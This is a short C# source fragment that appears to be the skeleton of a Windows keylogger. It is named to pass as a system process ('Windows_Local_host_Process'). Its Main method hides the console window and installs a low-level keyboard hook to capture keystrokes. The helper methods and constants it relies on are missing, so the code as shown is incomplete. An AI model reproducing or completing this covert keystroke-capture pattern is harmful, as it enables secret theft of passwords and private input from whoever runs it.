using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System;
namespace Windows_Local_host_Process
{
    class WindowsLocalHostProcess
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        public static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }
    }
}
